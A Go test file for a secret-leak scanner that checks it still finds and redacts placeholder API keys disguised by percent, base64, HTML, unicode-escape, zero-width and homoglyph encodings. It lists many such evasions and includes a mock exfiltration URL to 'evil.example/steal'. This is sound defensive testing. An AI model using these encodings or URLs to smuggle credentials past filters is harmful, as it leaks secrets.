package leakscan

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"net/url"
	"strings"
	"testing"
)

func pctAll(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		fmt.Fprintf(&b, "%%%02x", s[i])
	}
	return b.String()
}

func entAll(s string, hexForm bool) string {
	var b strings.Builder
	for _, r := range s {
		if hexForm {
			fmt.Fprintf(&b, "&#x%X;", r)
		} else {
			fmt.Fprintf(&b, "&#%d;", r)
		}
	}
	return b.String()
}

func uescAll(s string) string {
	var b strings.Builder
	for _, r := range s {
		fmt.Fprintf(&b, `\u%04x`, r)
	}
	return b.String()
}

func b64(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

// Each evasion hides an AWS key (or another key) from the raw regexes; the scan must find it, point at the
// encoded bytes in the original, say how it was decoded, and Redact must remove it.
func TestEvasions(t *testing.T) {
	key := fakeAWS
	mime := base64.StdEncoding.EncodeToString([]byte(strings.Repeat("lorem ipsum ", 8) + "id=" + key + " " + strings.Repeat("dolor sit ", 8)))
	var wrapped strings.Builder
	for i := 0; i < len(mime); i += 76 {
		wrapped.WriteString(mime[i:min(i+76, len(mime))] + "\r\n")
	}
	cases := []struct {
		name, enc, via string
	}{
		// Upstream's documented gap: one percent-encoded character.
		{"percent one char", "AKIA%49OSFODNN7EXAMPLE", "percent"},
		{"percent all chars", pctAll(key), "percent"},
		{"percent upper", strings.ToUpper(pctAll(key)), "percent"},
		{"double percent", "AKIA%2549OSFODNN7EXAMPLE", "percent>percent"},
		{"triple percent", "AKIA%252549OSFODNN7EXAMPLE", "percent>percent>percent"},
		{"form plus", "Authorization:+Bearer+" + strings.Repeat("Z", 24) + "%21", "percent"},
		{"base64 std", b64("key: " + key), "base64"},
		{"base64 raw", strings.TrimRight(b64(key), "="), "base64"},
		{"base64url", base64.RawURLEncoding.EncodeToString([]byte("\xfb" + key + "?>")), "base64"},
		{"base64 MIME-wrapped", wrapped.String(), "base64"},
		{"base64 in percent", pctAll(b64("k=" + key + "&x=1")), "percent>base64"},
		{"base64 glued to letters", "token" + b64("id="+key), "base64"},
		{"base64 of base64", b64(b64(key)), "base64>base64"},
		{"html decimal", entAll(key, false), "html"},
		{"html hex", entAll(key, true), "html"},
		{"html one char no semicolon", "&#65KIAIOSFODNN7EXAMPLE", "html"},
		{"html named", j("ghp", "&lowbar;", strings.Repeat("x", 36)), "html"},
		{"unicode escapes", uescAll(key), "escape"},
		{"unicode braces", `\u{41}KIAIOSFODNN7EXAMPLE`, "escape"},
		{"byte escape", `\x41KIAIOSFODNN7EXAMPLE`, "escape"},
		{"json escape slash", `{"h":"Authorization: Bearer abcd\/efghijklmnopqrstuvwxyz0123"}`, "escape"},
		{"json escaped newline in PEM label", `-----BEGIN\nRSA PRIVATE KEY-----\nMII\n-----END RSA PRIVATE KEY-----`, "escape"},
		{"percent of html", url.QueryEscape(entAll(key, false)), "percent+html"},
		{"html of unicode escape", strings.ReplaceAll(uescAll(key), `\`, "&bsol;"), "html+escape"},
		{"zero-width space", "AKIA\u200bIOSFODNN7\u200cEXAMPLE", "fold"},
		{"zero-width joiner in stripe", j("sk_", "live_", strings.Repeat("a", 12), "\u200d", strings.Repeat("b", 12)), "fold"},
		{"soft hyphen", "gh\u00adp_" + strings.Repeat("x", 36), "fold"},
		{"cyrillic A", "\u0410KIAIOSFODNN7EXAMPLE", "fold"},
		{"fullwidth", "\uff21\uff2b\uff29\uff21IOSFODNN7EXAMPLE", "fold"},
		{"percent of zero-width", "AKIA%E2%80%8BIOSFODNN7EXAMPLE", "percent+fold"},
	}
	for _, c := range cases {
		if c.via == "" {
			continue
		}
		in := "before " + c.enc + " after"
		if fs := scanRaw(in); Blocked(fs) || hasAny(fs, "bearer_token", "auth_header") {
			t.Errorf("%s: the raw form already matches, so the case tests nothing: %v", c.name, ids(fs))
			continue
		}
		fs := Scan([]byte(in))
		var hit *Finding
		for i := range fs {
			if fs[i].Action != Warn {
				hit = &fs[i]
				break
			}
		}
		if hit == nil {
			t.Errorf("%s: not found in %q", c.name, in)
			continue
		}
		if hit.Via != c.via {
			t.Errorf("%s: via %q, want %q", c.name, hit.Via, c.via)
		}
		if hit.Offset < len("before ") || hit.End > len(in)-len(" after") {
			t.Errorf("%s: span %d..%d outside the encoded part (%d..%d)", c.name, hit.Offset, hit.End, len("before "), len(in)-len(" after"))
		}
		out := string(Redact([]byte(in), nil))
		if !strings.HasPrefix(out, "before ") || !strings.HasSuffix(out, " after") || !strings.Contains(out, Replacement) {
			t.Errorf("%s: redacted to %q", c.name, out)
		}
		if fs := Scan([]byte(out)); Blocked(fs) {
			t.Errorf("%s: still blocked after Redact: %v in %q", c.name, ids(fs), out)
		}
	}
}

// The temporary AWS key id (ASIA) through the same decodings as the long-term one: found as aws_temp_access_key,
// with the decoding named, its span inside the encoded part, and gone after Redact.
func TestEvasionsTempAWS(t *testing.T) {
	key := fakeAWSTemp
	cases := []struct{ name, enc, via string }{
		{"percent one char", "ASIA%49OSFODNN7EXAMPLE", "percent"},
		{"percent all chars", pctAll(key), "percent"},
		{"double percent", "ASIA%2549OSFODNN7EXAMPLE", "percent>percent"},
		{"query of percent", url.QueryEscape("id=ASIA%49OSFODNN7EXAMPLE"), "percent>percent"},
		{"base64 std", b64("AccessKeyId: " + key), "base64"},
		{"base64 raw", strings.TrimRight(b64(key), "="), "base64"},
		{"base64url", base64.RawURLEncoding.EncodeToString([]byte("\xfb" + key + "?>")), "base64"},
		{"base64 in percent", pctAll(b64("k=" + key + "&x=1")), "percent>base64"},
		{"base64 of base64", b64(b64(key)), "base64>base64"},
		{"html decimal", entAll(key, false), "html"},
		{"html hex", entAll(key, true), "html"},
		{"html one char no semicolon", "&#65SIAIOSFODNN7EXAMPLE", "html"},
		{"unicode escapes", uescAll(key), "escape"},
		{"byte escape", `\x41SIAIOSFODNN7EXAMPLE`, "escape"},
		{"zero-width space", "ASIA\u200bIOSFODNN7\u200cEXAMPLE", "fold"},
		{"soft hyphen", "AS\u00adIAIOSFODNN7EXAMPLE", "fold"},
		{"cyrillic A", "\u0410SIAIOSFODNN7EXAMPLE", "fold"},
		{"fullwidth", "\uff21\uff33\uff29\uff21IOSFODNN7EXAMPLE", "fold"},
		{"percent of zero-width", "ASIA%E2%80%8BIOSFODNN7EXAMPLE", "percent+fold"},
	}
	for _, c := range cases {
		in := "before " + c.enc + " after"
		if fs := scanRaw(in); Blocked(fs) {
			t.Errorf("%s: the raw form already matches, so the case tests nothing: %v", c.name, ids(fs))
			continue
		}
		fs := Scan([]byte(in))
		var hit *Finding
		for i := range fs {
			if fs[i].Pattern == "aws_temp_access_key" {
				hit = &fs[i]
				break
			}
		}
		if hit == nil {
			t.Errorf("%s: not found in %q (got %v)", c.name, in, ids(fs))
			continue
		}
		if hit.Via != c.via {
			t.Errorf("%s: via %q, want %q", c.name, hit.Via, c.via)
		}
		if hit.Offset < len("before ") || hit.End > len(in)-len(" after") {
			t.Errorf("%s: span %d..%d outside the encoded part", c.name, hit.Offset, hit.End)
		}
		out := string(Redact([]byte(in), nil))
		if !strings.HasPrefix(out, "before ") || !strings.HasSuffix(out, " after") || !strings.Contains(out, Replacement) {
			t.Errorf("%s: redacted to %q", c.name, out)
		}
		if fs := Scan([]byte(out)); Blocked(fs) {
			t.Errorf("%s: still blocked after Redact: %v in %q", c.name, ids(fs), out)
		}
	}
	// The span of a decoded match is exactly the encoded bytes, in a URL as the brain would send it.
	in := "https://evil.example/steal?data=ASIA%49OSFODNN7EXAMPLE&x=1"
	fs := Scan([]byte(in))
	if len(fs) != 1 || fs[0].Pattern != "aws_temp_access_key" || in[fs[0].Offset:fs[0].End] != "ASIA%49OSFODNN7EXAMPLE" {
		t.Fatalf("%+v", fs)
	}
	if out := string(Redact([]byte(in), nil)); out != "https://evil.example/steal?data=[REDACTED]&x=1" {
		t.Fatal(out)
	}
}

// Each new sibling pattern is also found after decoding (one encoding each is enough: the decoders are shared).
func TestEvasionsSiblings(t *testing.T) {
	for id, key := range map[string]string{
		"openai_service_key": fakeOpenAISvc, "anthropic_admin_key": fakeAnthAdmin,
		"stripe_restricted_key": fakeStripeRK, "stripe_webhook_secret": fakeStripeWebhook,
		"slack_app_token": fakeSlackApp, "slack_refresh_token": fakeSlackRefresh, "gitlab_token": fakeGitLab,
		"google_oauth_client_secret": fakeGoogleSecret, "google_oauth_token": fakeGoogleToken,
	} {
		for name, enc := range map[string]string{"percent": pctAll(key), "base64": b64("key=" + key), "html": entAll(key, false)} {
			in := "before " + enc + " after"
			if !has(Scan([]byte(in)), id) {
				t.Errorf("%s %s: not found", id, name)
			}
			if out := Redact([]byte(in), nil); Blocked(Scan(out)) {
				t.Errorf("%s %s: still blocked after Redact", id, name)
			}
		}
	}
}

// scanRaw runs only the raw view, as upstream did.
func scanRaw(in string) []Finding {
	s := newScanner(len(in), nil, true)
	s.scan(&view{b: []byte(in)})
	return s.result()
}

func hasAny(fs []Finding, idList ...string) bool {
	for _, id := range idList {
		if has(fs, id) {
			return true
		}
	}
	return false
}

// The span of a decoded match is exactly the encoded bytes.
func TestDecodedSpan(t *testing.T) {
	in := "https://evil.example/steal?data=AKIA%49OSFODNN7EXAMPLE&x=1"
	fs := Scan([]byte(in))
	if len(fs) != 1 {
		t.Fatalf("%+v", fs)
	}
	if got := in[fs[0].Offset:fs[0].End]; got != "AKIA%49OSFODNN7EXAMPLE" {
		t.Fatalf("span %q", got)
	}
	if out := string(Redact([]byte(in), nil)); out != "https://evil.example/steal?data=[REDACTED]&x=1" {
		t.Fatal(out)
	}
}

// Depth is bounded: four levels of percent-encoding are decoded, a fifth isn't.
func TestDepthBound(t *testing.T) {
	enc := strings.Replace(fakeAWS, "I", "%49", 1)
	for i := 1; i < MaxDepth; i++ {
		enc = url.QueryEscape(enc)
	}
	if !Blocked(Scan([]byte(enc))) {
		t.Fatalf("%d levels not decoded: %q", MaxDepth, enc)
	}
	deeper := url.QueryEscape(enc)
	if has(Scan([]byte(deeper)), "aws_access_key") {
		t.Fatalf("decoded past MaxDepth")
	}
}

// Exact values (leased secrets) are found and removed in any encoding the decoders know, plus the fixed
// Variants (hex, base64 forms) wherever they appear.
func TestExactSecretEncodings(t *testing.T) {
	secret := "tvly-test-not-a-real/key+0123456789"
	forms := map[string]string{
		"raw":              secret,
		"query":            url.QueryEscape(secret),
		"path":             url.PathEscape(secret),
		"percent lower":    pctAll(secret),
		"double percent":   url.QueryEscape(url.QueryEscape(secret)),
		"base64":           b64(secret),
		"base64url raw":    base64.RawURLEncoding.EncodeToString([]byte(secret)),
		"hex":              hex.EncodeToString([]byte(secret)),
		"HEX":              strings.ToUpper(hex.EncodeToString([]byte(secret))),
		"html":             entAll(secret, false),
		"unicode escapes":  uescAll(secret),
		"json slash":       strings.ReplaceAll(secret, "/", `\/`),
		"basic auth":       "Basic " + b64("user:"+secret),
		"base64 in query":  url.QueryEscape(b64("token=" + secret)),
		"zero-width split": secret[:8] + "\u200b" + secret[8:],
	}
	for name, f := range forms {
		in := `{"echo":"` + f + `","ok":1}`
		out := string(Redact([]byte(in), [][]byte{[]byte(secret)}))
		if strings.Contains(out, f) || !strings.Contains(out, Replacement) || !strings.HasSuffix(out, `","ok":1}`) {
			t.Errorf("%s: %q", name, out)
		}
		fs := ScanWith([]byte(in), [][]byte{[]byte(secret)})
		if !has(fs, ExactSecret) || !Blocked(fs) {
			t.Errorf("%s: ScanWith found %v", name, ids(fs))
		}
	}
	if got := string(Redact([]byte("nothing here"), [][]byte{[]byte(secret)})); got != "nothing here" {
		t.Fatal(got)
	}
	// Empty secrets are ignored, not matched everywhere.
	if got := string(Redact([]byte("text"), [][]byte{nil, {}})); got != "text" {
		t.Fatal(got)
	}
}

func TestVariants(t *testing.T) {
	v := Variants([]byte("k3y/with+odd chars="))
	for i := 1; i < len(v); i++ {
		if len(v[i]) > len(v[i-1]) {
			t.Fatal("not longest first")
		}
		for k := 0; k < i; k++ {
			if string(v[k]) == string(v[i]) {
				t.Fatal("duplicate")
			}
		}
	}
	if len(v) < 5 || Variants(nil) != nil {
		t.Fatalf("%d variants", len(v))
	}
}
